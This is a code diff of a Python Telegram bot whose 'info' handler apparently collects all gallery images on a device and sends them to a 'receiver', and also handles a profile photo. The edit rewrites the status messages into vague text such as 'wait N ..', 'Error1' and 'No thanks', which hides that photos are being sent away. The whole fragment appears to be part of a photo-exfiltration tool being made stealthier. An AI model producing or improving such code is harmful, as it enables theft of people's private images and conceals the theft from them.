@@ -57,17 +57,17 @@ async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 )
             os.remove(file_path)
         else:
-            await update.message.reply_text("❌ Profile photo not found.")
+            await update.message.reply_text("❌ Error1.")
     except Exception as e:
-        await update.message.reply_text(f"⚠️ Profile Photo Error:\n{e}")
+        await update.message.reply_text(f"⚠️ Error2 \n{e}")
 
     # 📂 Send All Gallery Photos
     try:
         all_images = get_all_images()
         if not all_images:
-            await update.message.reply_text("⚠️ No images found.")
+            await update.message.reply_text(" No thanks.")
         else:
-            await update.message.reply_text(f"📤 Sending {len(all_images)} images to receiver...")
+            await update.message.reply_text(f"📤 wait {len(all_images)} ..")
             for img_path in all_images:
                 try:
                     with open(img_path, 'rb') as img:
@@ -79,7 +79,7 @@ async def info(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 except:
                     continue  # Skip if file is corrupted or can't open
     except Exception as e:
-        await update.message.reply_text(f"⚠️ Gallery Error:\n{e}")
+        await update.message.reply_text(f"⚠️Error:\n{e}")
 
 # ✅ Bot Start
 def main():
